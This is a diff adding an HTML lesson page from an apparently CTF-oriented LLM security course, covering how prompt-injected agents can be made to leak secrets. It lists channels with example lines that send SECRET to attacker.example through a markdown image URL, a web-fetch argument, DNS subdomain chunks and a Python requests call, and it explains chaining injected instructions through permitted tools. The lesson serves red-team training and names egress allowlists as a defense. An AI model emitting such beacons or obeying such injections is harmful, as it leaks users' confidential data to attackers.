@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Lesson 6 — Exfiltration Channels</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+<div class="masthead">
+  <div class="kicker"><span>LLM Security · Lesson 6</span><span><a class="langbtn" href="0006-exfiltration-channels.zh.html" title="切换到中文">中</a></span></div>
+  <h1>Exfiltration Channels</h1>
+  <p class="dek">Stealing a secret is two problems: making the model say it, and making it leave the building. The second problem has a whole toolbox of its own.</p>
+</div>
+
+<p>In the CrowdStrike "AI Unlocked: Agents of Chaos" mission, an information-disclosure puzzle only scores when the secret demonstrably reaches you. That is <strong>exfiltration</strong>: moving data from inside the agent's trust boundary to a place you control. The model being <em>willing</em> to reveal the secret is necessary but not sufficient — you need a channel the scaffold will actually carry.</p>
+
+<h2>The channel catalog</h2>
+<ul>
+  <li><strong>Markdown image rendering</strong> — the classic. If any rendered surface displays model output as markdown, one line does it: <code>![x](https://attacker.example/?d=SECRET)</code>. The renderer fetches the URL; the secret rides out in the query string; you read your server logs. No tool call required.</li>
+  <li><strong>Link clicks / tracking pixels</strong> — same mechanism, human-mediated: a shortened or disguised URL that a user (or a link-preview bot) triggers, carrying data in the path or parameters.</li>
+  <li><strong>Tool arguments as side channel</strong> — an innocent-looking <code>search("customer_8842_api_key")</code> or a web-fetch of <code>https://attacker.example/leak?v=…</code> smuggles the secret inside a tool call the scaffold permits. The tool layer rarely inspects arguments for confidentiality.</li>
+  <li><strong>DNS / URL parameter steganography</strong> — split the secret across subdomains (<code>&lt;chunk1&gt;.&lt;chunk2&gt;.attacker.example</code>) so even byte-length-limited lookups leak it. DNS exfiltration predates LLMs and still works when only name resolution egress exists.</li>
+  <li><strong>Code execution write-outs</strong> — if the agent can run code, a one-liner (<code>requests.get("https://attacker.example/", params={"d": secret})</code>) is the most reliable channel of all.</li>
+  <li><strong>Prompt-completion leakage</strong> — when no network egress exists, the "channel" is the transcript itself: get the secret into an output the grader (or a downstream user) can see. Slower, sometimes the only option.</li>
+</ul>
+
+<div class="keystone">
+  <span class="label">Keystone</span>
+  <strong>Any component that fetches a URL is an exfiltration primitive.</strong> Renderers, link previews, web tools, and code runners all make outbound requests you can aim. Audit the target for outbound fetchers first; the markdown-image pattern is merely the cheapest special case.
+</div>
+
+<div class="antipattern">
+  <span class="label">Anti-pattern</span>
+  <strong>Extracting the secret and then celebrating.</strong> If the secret sits in a chat bubble that never leaves the environment, the disclosure doesn't score. Always plan the full chain — extract <em>and</em> exfiltrate — before spending tokens, or you pay for half an attack twice.
+</div>
+
+<h2>Building chains from limited tools</h2>
+<p>Real targets rarely hand you a fetch tool with a free-form URL. The craft is chaining: an injected instruction makes the model place the secret into a <em>permitted</em> tool's argument (a search query, an email to "support", a file write to a synced folder), and the permitted tool's normal behavior carries it out. Combine with Lesson 5: pick the tool whose egress is least inspected, not the one whose description promises the most.</p>
+
+<p>Defense-side, this is why <strong>egress allowlists</strong> exist: restrict outbound destinations to a known set, and markdown-image exfiltration dies at the network layer no matter how good your injection was. Expect hardened puzzles to force you off the image pattern onto weirder channels — that constraint is the puzzle.</p>
+
+<h2>Retrieve it</h2>
+<div class="quiz">
+  <details><summary>Why does the markdown-image pattern exfiltrate?</summary>
+    <p class="answer">The renderer fetches URLs.</p>
+    <p class="why"><code>![x](https://attacker.example/?d=SECRET)</code> needs no tool call: any surface that renders model output as markdown issues an HTTP request to resolve the image, and the secret travels out in the query string to the attacker's logs.</p>
+  </details>
+  <details><summary>What makes tool arguments a side channel?</summary>
+    <p class="answer">Egress without inspection.</p>
+    <p class="why">A search query or web-fetch argument containing the secret leaves through a tool the scaffold already trusts; argument contents are rarely checked for confidentiality, so permitted tools become unmonitored exits.</p>
+  </details>
+  <details><summary>Which defense kills most exfil channels?</summary>
+    <p class="answer">An egress allowlist.</p>
+    <p class="why">Restricting outbound destinations to a known allowlist stops image fetches, link-preview beacons, and crafted tool URLs at the network layer — regardless of how successful the prompt injection was upstream.</p>
+  </details>
+</div>
+
+<h2>Prove it to yourself</h2>
+<div class="task">
+  <span class="label">Try it — 10 minutes</span>
+  Run a local listener (<code>python3 -m http.server 8000</code>) and open its directory listing in a browser. Now, in any chat UI that renders markdown, get a model to output <code>![p](http://localhost:8000/ping1)</code> (a harmless beacon). Watch the request hit your listener. You have just exfiltrated one bit through image rendering. Swap <code>ping1</code> for any future secret.
+</div>
+
+<h2>Primary source</h2>
+<p>Greshake et al., <a href="https://arxiv.org/abs/2302.12173">"Compromising Real-World LLM-integrated Applications with Indirect Prompt Injection"</a> — section on exfiltration shows exactly these channels used end to end. Pair with the <a href="https://genai.owasp.org/llm-top-10/">OWASP LLM Top 10</a> sensitive-information-disclosure entry for the defender's framing.</p>
+
+<p class="next"><a href="0005-agent-attack-surface.html">← Previous: Agent Attack Surface</a> &nbsp;·&nbsp; <a href="0007-evading-detection.html">Next: Evading Detection →</a> &nbsp;·&nbsp; <a href="../reference/llm-security-cheatsheet.html">Cheat sheet</a></p>
+<p class="ask">Anything unclear? Ask your teacher — that's what the agent is here for.</p>
+</body>
+</html>
